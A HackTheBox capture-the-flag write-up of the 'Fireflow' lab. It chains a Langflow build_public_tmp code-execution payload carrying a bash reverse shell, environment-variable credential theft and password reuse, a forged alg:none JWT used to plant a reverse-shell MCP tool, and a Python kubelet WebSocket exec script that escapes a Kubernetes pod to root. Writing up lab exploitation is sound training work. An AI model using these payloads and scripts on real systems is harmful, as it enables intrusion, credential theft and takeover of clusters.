---
title: "Fireflow @ HackTheBox"
date: 2026-06-23 09:00:00 +0200
categories: [Writeups, HackTheBox]
tags: [Langflow, JWT, MCP, Kubernetes, RCE, privilege escalation]
author: andrea
image:
  path: commons/fireflow1.png
  no_bg: true
---

# Fireflow @ HackTheBox

## Enumeration

Start with classical nmap scans

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp open  ssl/http nginx
|_http-title: Did not follow redirect to https://fireflow.htb/
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only SSH and HTTPS are exposed. The certificate is a wildcard (`*.fireflow.htb`), a hint that subdomains are in use. We add the host to `/etc/hosts`.

Trying to register and log in as a new user, the page responds with:

![alt text](/assets/img/posts/fireflow/image-5.png)

We need admin confirmation to log in.

Clicking **Open Agent** redirects us to `http://flow.fireflow.htb` — a new subdomain, not yet enumerated, which we also add to `/etc/hosts`.

![alt text](/assets/img/posts/fireflow/image-1.png)

It looks like an LLM agent, but the service is still under maintenance and not immediately exploitable from there.

## Exploitation

Continuing enumeration on `http://fireflow.htb` we identify **Flow engine 1.8.2** — Langflow. A quick search confirms this version is vulnerable to the following PoC.

PoC found here: [GHSA-vwmf-pq79-vjvx](https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx)

Langflow exposes an endpoint meant to build public flows (demos, shared chatbots) without requiring authentication:

```
POST /api/v1/build_public_tmp/{flow_id}/flow
```

The flaw: the endpoint accepts an optional `data` parameter. When supplied, the endpoint uses the attacker-supplied flow instead of the one stored in the database — and that flow can contain arbitrary Python code in its node definitions, which is passed straight to `exec()` with no sandboxing.

The critical detail: `prepare_global_scope()` also executes `ast.Assign` nodes — so an assignment like `_x = os.system(...)` runs already during *compilation* of the component, before the flow even "runs".

We craft the payload: a custom node (`EvilComp`) whose `code` field launches a reverse shell, followed by the minimal definition of a valid `Component`, needed so the rest of the graph validation doesn't fail.

```bash
curl -k -X POST "https://fireflow.htb/api/v1/build_public_tmp/<FLOW_ID>/flow" \
     -H "Content-Type: application/json" \
     -b "client_id=attacker" \
     -d '{
           "data": {
             "nodes": [{
               "id": "Evil",
               "type": "genericNode",
               "position": {"x": 0, "y": 0},
               "data": {
                 "id": "Evil",
                 "type": "EvilComp",
                 "node": {
                   "template": {
                     "code": {
                       "type": "code",
                       "required": true,
                       "show": true,
                       "multiline": true,
                       "value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/10.10.15.154/4444 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass EvilComp(Component):\n    display_name=\"Evil-X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                       "name": "code",
                       "password": false,
                       "advanced": false,
                       "dynamic": false
                     },
                     "_type": "Component"
                   },
                   "description": "Evil-X",
                   "base_classes": ["Data"],
                   "display_name": "EvilComp",
                   "name": "EvilComp",
                   "frozen": false,
                   "outputs": [{
                     "types": ["Data"],
                     "selected": "Data",
                     "name": "o",
                     "display_name": "O",
                     "method": "r",
                     "value": "UNDEFINED",
                     "cache": true,
                     "allows_loop": false,
                     "tool_mode": false,
                     "hidden": null,
                     "required_inputs": null,
                     "group_outputs": false
                   }],
                   "field_order": ["code"],
                   "beta": false,
                   "edited": false
                 }
               }
             }],
             "edges": []
           }
         }'
```

Listener ready, we get the shell:

```bash
nc -lvnp 4444
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.244.214 51242
bash: cannot set terminal process group (1527): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fireflow:/var/lib/langflow$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

### www-data → nightfall

First thing to check on an application server: the process environment variables.

```bash
www-data@fireflow:/var/lib/langflow$ env
```

```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_CONFIG_DIR=/var/lib/langflow
...
```

The Langflow superuser password in cleartext. We check local users:

```bash
www-data@fireflow:/$ cat /etc/passwd | grep bash
```

```
root:x:0:0:root:/root:/bin/bash
nightfall:x:1000:1000::/home/nightfall:/bin/bash
```

We try the same password on `nightfall` — password reuse between the application and the system, a classic pattern.

```bash
www-data@fireflow:/$ su nightfall
Password: n1ghtm4r3_b4_n1ghtf4ll
```

```
nightfall@fireflow:/$ whoami
nightfall
```

Password reuse confirmed.

`sudo -l` gives nothing:

```bash
nightfall@fireflow:~$ sudo -l
```

```
Sorry, user nightfall may not run sudo on fireflow.
```

In the home directory we find an interesting hidden folder:

```bash
nightfall@fireflow:~$ ls -la
```

```
total 36
drwxr-x--- 5 nightfall nightfall 4096 May 12 15:28 .
drwxr-xr-x 3 root      root      4096 May 12 15:28 ..
lrwxrwxrwx 1 root      root         9 May 12 14:24 .bash_history -> /dev/null
-rw-r--r-- 1 nightfall nightfall  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 nightfall nightfall 3771 Mar 31  2024 .bashrc
drwx------ 2 nightfall nightfall 4096 May 12 15:28 .cache
drwxrwxr-x 3 nightfall nightfall 4096 May 12 15:28 .local
drwx------ 2 nightfall nightfall 4096 Aug 18 08:51 .mcp
-rw-r----- 1 root      nightfall   33 Aug 18 08:52 user.txt
```

```bash
nightfall@fireflow:~$ cd .mcp
nightfall@fireflow:~/.mcp$ cat config.json
```

```json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

An MCP (Model Context Protocol) AI Tool Registry, listening on a high port — almost certainly a Kubernetes NodePort. We have credentials.

### MCP Server discovery

```bash
nightfall@fireflow:~/.mcp$ curl -s http://127.0.0.1:30080/api/v1/version
```

```json
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": ["HS256", "none"]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

Two details stand out immediately: `supported_algorithms` lists both `HS256` and **`none`** — the classic "JWT algorithm confusion" weakness — and `POST /api/v1/tools` requires an `admin` role.

Authenticating with the credentials we found:

```bash
nightfall@fireflow:~/.mcp$ curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
     -H "Content-Type: application/json" \
     -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps",
  "token_type": "bearer"
}
```

Decoding the payload: `{"sub":"langflow-bot","role":"user"}`. We need `role: admin`.

### JWT alg:none bypass

With `alg: none` the signature is an empty string — the server verifies nothing, so we can forge any claims we want.

```bash
nightfall@fireflow:~/.mcp$ python3 -c '
import base64, json

def b64url(d):
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "langflow-bot", "role": "admin"}

token = (
    b64url(json.dumps(header, separators=(",", ":")).encode())
    + "." + b64url(json.dumps(payload, separators=(",", ":")).encode())
    + "."
)
print(token)
'
```

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

Note the trailing dot with no signature — that's the `none` algorithm format. We verify it works against the admin-only endpoint, first registering a harmless tool:

```bash
nightfall@fireflow:~/.mcp$ curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
     -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
     -H "Content-Type: application/json" \
     -d '{
           "name": "sys_info3",
           "description": "debug tool",
           "inputSchema": {"type": "object", "properties": {}},
           "code": "import os\nprint(os.popen(\"id\").read())\n"
         }'
```

```json
{"status": "registered", "name": "sys_info3"}
```

We confirm code execution by invoking it through the MCP JSON-RPC protocol:

```bash
nightfall@fireflow:~/.mcp$ curl -s -X POST http://127.0.0.1:30080/mcp \
     -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
     -H "Content-Type: application/json" \
     -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"sys_info3","arguments":{}}}'
```

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "content": [{"type": "text", "text": "uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)\n\n"}],
    "isError": false
  }
}
```

Bypass confirmed, server-side code execution as admin on the registry.

### MCP Tool Injection — shell inside a Kubernetes pod

We register a tool that spawns a reverse shell:

```bash
nightfall@fireflow:~/.mcp$ curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
     -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
     -H "Content-Type: application/json" \
     -d '{
           "name": "exploitnotes",
           "description": "evil",
           "code": "import os; os.system(\"bash -c \\\"bash -i >& /dev/tcp/10.10.15.154/4445 0>&1\\\"\")"
         }'
```

```json
{"status": "registered", "name": "exploitnotes"}
```

Triggering it:

```bash
nightfall@fireflow:~/.mcp$ curl -s http://127.0.0.1:30080/mcp \
     -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
     -H "Content-Type: application/json" \
     -d '{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"exploitnotes","arguments":{}}}'
```

And on the listener:

```bash
nc -lvnp 4445
```

```
Listening on 0.0.0.0 4445
Connection received on 10.129.244.214 33521
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
mcp@mcp-server-54464cb475-29ztf:/app$ id
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
```

The hostname itself (`mcp-server-54464cb475-29ztf`) confirms we're inside a Kubernetes pod.

> Note: the `mcp-server` pod restarts periodically and the shell dies along with it — just repeat the register + trigger steps to get back in.

### Kubernetes enumeration

Every pod with a service account has a token at a fixed path:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
mcp@mcp-server-54464cb475-29ztf:/app$ env | grep -i kubernetes
```

```
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT_443_TCP_PORT=443
```

Before trying operations blindly, we check what we're allowed to do with a `SelfSubjectRulesReview`:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -X POST \
     https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
     -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

```json
{
  "status": {
    "resourceRules": [
      {"verbs": ["get"], "apiGroups": [""], "resources": ["nodes/proxy"]},
      {"verbs": ["create"], "apiGroups": ["authorization.k8s.io"], "resources": ["selfsubjectaccessreviews", "selfsubjectrulesreviews"]},
      {"verbs": ["create"], "apiGroups": ["authentication.k8s.io"], "resources": ["selfsubjectreviews"]}
    ]
  }
}
```

Key permission: `GET nodes/proxy`. We can read through the kubelet proxy, but we don't have `create` — so no exec via the API server, for now.

We can't list nodes directly, but the name often matches the machine hostname in k3s setups:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk -H "Authorization: Bearer $TOKEN" \
     "https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/pods" \
     | python3 -m json.tool | grep -E '"name"|"namespace"'
```

```
"name": "prometheus-prometheus-node-exporter-nmntq"
"namespace": "monitoring"
...
"name": "coredns-76c974cb66-cn7l6"
"namespace": "kube-system"
...
```

`fireflow` is the node name. In the pod list, one stands out: `prometheus-prometheus-node-exporter-nmntq`, with `proc`, `sys`, `root` volumes mounted — typical of a `node-exporter` DaemonSet with `hostPID`/`hostNetwork` and the host filesystem mounted, running as root.

We try exec via the API server, blocked by RBAC as expected:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk \
     -H "Authorization: Bearer $TOKEN" \
     "https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/run/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter" \
     -d "cmd=id"
```

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

Blocked, as expected — the `create` verb is missing.

### Node escape — kubelet WebSocket exec

The API server blocks the classic HTTP exec, but the kubelet also exposes an `/exec` endpoint via **WebSocket** (port 10250), which enforces a different check than the HTTP `/run` path through the API server: our token, which only has `GET nodes/proxy`, is enough to open the WebSocket channel.

We check that `websockets` is available:

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ python3 -c "import websockets; print('available')"
```

```
available
```

`pwn.py` script:

```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE    = "10.129.244.214"
NE_NS   = "monitoring"
NE_POD  = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT  = "node-exporter"
TOKEN   = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
            f"?output=1&error=1&{args}")

    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    print(data[1:].decode(errors='replace'), end='')
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
```

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ python3 /tmp/pwn.py "id"
```

```
uid=0(root) gid=65534(nobody) groups=10(wheel),65534(nobody)
{"metadata":{},"status":"Success"}
```

Root inside the `node-exporter` container. This pod mounts the host's root filesystem at `/host/root` — we read the flag directly from there.

### Root flag

```bash
mcp@mcp-server-54464cb475-29ztf:/app$ python3 /tmp/pwn.py "cat /host/root/root/root.txt"
```

```
76c78de184f4bea62305beb9ca37b945
{"metadata":{},"status":"Success"}
```